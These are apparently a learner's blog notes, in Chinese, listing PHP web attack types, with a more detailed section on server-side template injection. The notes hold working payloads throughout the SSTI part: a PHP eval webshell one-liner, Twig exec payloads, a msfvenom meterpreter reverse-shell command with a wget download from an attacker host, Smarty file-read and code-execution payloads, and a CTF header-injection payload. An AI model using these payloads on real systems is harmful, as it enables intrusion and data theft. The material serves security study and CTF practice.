    <content type="html"><![CDATA[<p>PHP漏洞介绍</p><p><a href="https://www.jb51.net/article/31898.htm">https://www.jb51.net/article/31898.htm</a></p><p>针对php网站的主要几种攻击方式</p><h3 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="1.命令注入"></a>1.命令注入</h3><p><a href="https://blog.csdn.net/qq2539879928/article/details/106635907">https://blog.csdn.net/qq2539879928/article/details/106635907</a></p><h3 id="2-eval注入"><a href="#2-eval注入" class="headerlink" title="2.eval注入"></a>2.eval注入</h3><p>eval函数，常用：@eval($_POST[‘cmd’])</p><h3 id="3-客户端脚本攻击"><a href="#3-客户端脚本攻击" class="headerlink" title="3.客户端脚本攻击"></a>3.客户端脚本攻击</h3><h3 id="4-跨网站脚本攻击"><a href="#4-跨网站脚本攻击" class="headerlink" title="4.跨网站脚本攻击"></a>4.跨网站脚本攻击</h3><h3 id="5-sql注入攻击"><a href="#5-sql注入攻击" class="headerlink" title="5.sql注入攻击"></a>5.sql注入攻击</h3><h3 id="6-跨网站请求伪造攻击"><a href="#6-跨网站请求伪造攻击" class="headerlink" title="6.跨网站请求伪造攻击"></a>6.跨网站请求伪造攻击</h3><p>CSRF</p><h3 id="7-Session会话劫持"><a href="#7-Session会话劫持" class="headerlink" title="7.Session会话劫持"></a>7.Session会话劫持</h3><h3 id="8-Session固定攻击"><a href="#8-Session固定攻击" class="headerlink" title="8.Session固定攻击"></a>8.Session固定攻击</h3><h3 id="9-HTTP响应拆分攻击"><a href="#9-HTTP响应拆分攻击" class="headerlink" title="9.HTTP响应拆分攻击"></a>9.HTTP响应拆分攻击</h3><h3 id="10-文件上传漏洞"><a href="#10-文件上传漏洞" class="headerlink" title="10.文件上传漏洞"></a>10.文件上传漏洞</h3><p><a href="https://blog.csdn.net/weixin_44519789/article/details/116570426">https://blog.csdn.net/weixin_44519789/article/details/116570426</a></p><h3 id="11-目录穿越漏洞"><a href="#11-目录穿越漏洞" class="headerlink" title="11.目录穿越漏洞"></a>11.目录穿越漏洞</h3><p><a href="https://blog.csdn.net/angry_program/article/details/107855078">https://blog.csdn.net/angry_program/article/details/107855078</a></p><h3 id="12-远程文件包含攻击"><a href="#12-远程文件包含攻击" class="headerlink" title="12.远程文件包含攻击"></a>12.远程文件包含攻击</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/108724251">https://blog.csdn.net/qq_45300786/article/details/108724251</a></p><h3 id="13-动态注入函数攻击"><a href="#13-动态注入函数攻击" class="headerlink" title="13.动态注入函数攻击"></a>13.动态注入函数攻击</h3><h3 id="14-URL攻击"><a href="#14-URL攻击" class="headerlink" title="14.URL攻击"></a>14.URL攻击</h3><h3 id="15-表单提交欺骗攻击"><a href="#15-表单提交欺骗攻击" class="headerlink" title="15.表单提交欺骗攻击"></a>15.表单提交欺骗攻击</h3><h3 id="16-HTTP请求欺骗攻击"><a href="#16-HTTP请求欺骗攻击" class="headerlink" title="16.HTTP请求欺骗攻击"></a>16.HTTP请求欺骗攻击</h3><h3 id="17-模板注入"><a href="#17-模板注入" class="headerlink" title="17.模板注入"></a>17.模板注入</h3><p>(从这里找到了大佬博客：<a href="https://www.cnblogs.com/bmjoker/">https://www.cnblogs.com/bmjoker/</a>)</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>模板引擎：这里特指用于Web开发的模板引擎</p><p>​        它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前</p><p>ssti模板注入</p><p>​                            —–也称服务器端模板注入</p><p>当前流行框架，比如python的flask</p><p>php的tp，java的spring</p><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>​        服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>利用图表</p><p><img src="/2021/08/25/src/leak/1344396-20200911174631687-758048107.png" alt="img"></p><h4 id="Twig模板"><a href="#Twig模板" class="headerlink" title="Twig模板"></a>Twig模板</h4><p>由图可以看出，在经过模板解析后的内容</p><p><img src="/2021/08/25/src/leak/1344396-20200818195801226-981945295.png" alt="img"></p><p>payload（2.0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200818231853350-914354726.png" alt="img"></p><p>文章还详细介绍了使用msf通过Twig模板注入获取shell</p><p>使用msf生成了一个php meterpreter有效载荷</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=<span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span> LPORT=<span class="number">4321</span> &gt; /<span class="keyword">var</span>/www/html/shell.txt</span><br></pre></td></tr></table></figure><p> <img src="/2021/08/25/src/leak/1344396-20200818232520602-1757346385.png" alt="img"></p><p> 模板注入远程下载shell，并重命名运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;wget http://192.168.127.131/shell.txt </span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200818232914668-1182705687.png" alt="img"></p><h4 id="Smarty模板"><a href="#Smarty模板" class="headerlink" title="Smarty模板"></a>Smarty模板</h4><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p>CTF地址：<a href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p><p>xff头做文章，进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For：&#123;sysytem(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure><p>这题我没有单独写文章，因为解题过程很快，知识点对应上了。</p><p>smarty-ssti常规利用方式</p><p><strong>1. {$smarty.version}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233050238-1942906786.png" alt="img"></p><p><strong>2. {php}{/php}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;&#x2F;php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233259128-196602210.png" alt="img"></p><p><strong>3. {literal}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;   </span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820233719367-1535357026.png" alt="img"></p><p><strong>4.</strong> <strong>getstreamvariable</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820234305773-495371489.png" alt="img"></p><p><strong>5. {if}{/if}</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200820234610811-341143885.png" alt="img"></p><p>python中的ssti</p><p>常见模板有：jinja2， tornado</p><h4 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h4><p>以Django的模板为模型的</p><p>它是flask框架的一部分，Jinja2会把模板参数提供的相应的值替换了  块。</p><p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP漏洞介绍&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jb51.net/article/31898.htm&quot;&gt;https://www.jb51.net/article/31898.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;针对php网站的主要几种攻击方式&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
</feed>
